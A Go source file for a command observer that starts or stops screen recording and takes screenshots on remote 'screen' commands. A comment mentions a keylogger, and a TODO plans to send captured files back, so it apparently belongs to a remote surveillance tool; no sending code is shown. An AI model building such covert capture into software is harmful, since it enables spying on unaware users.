package internal

import (
	"log"
)

// KeyLogger commands Observer
type ScreenshotCmdObserver struct {
	recorder         *ScreenRecorder
	recordingChannel chan *Screenshot
}

func (o *ScreenshotCmdObserver) execute(cmd string, data []string) {
	if cmd != "screen" {
		return
	}

	log.Println("ScreenshotCmdObserver: new action triggered")

	// This commands needs data to operate
	if len(data) <= 0 {
		return
	}

	if data[0] == "record" {
		if len(data) <= 1 {
			return
		}

		action := data[1]

		switch action {
		case "start":
			// Starts recording in a folder
			o.startRecording()
			return
		case "stop":
			// Stops recording
			o.stopRecording()
			return
		case "shot":
			// Take a Screenshot and send it back
			o.shot()
			return
		}

		return
	}
}

func (o *ScreenshotCmdObserver) startRecording() {
	o.recordingChannel = make(chan *Screenshot)

	go func() {
		o.recorder.StartCapturing(o.recordingChannel)

		for {
			shot := <-o.recordingChannel
			log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
		}
	}()
}

func (o *ScreenshotCmdObserver) stopRecording() {
	o.recorder.StopCapturing()
}

func (o *ScreenshotCmdObserver) shot() {
	// Set 'tmp' as group for the folder
	shot := o.recorder.ScreenShot("tmp")
	filepath := shot.FilePath
	_ = filepath

	// TODO: send the file back
}

func NewScreenshotCmdObserver(recorder *ScreenRecorder) *ScreenshotCmdObserver {
	return &ScreenshotCmdObserver{
		recorder: recorder,
	}
}
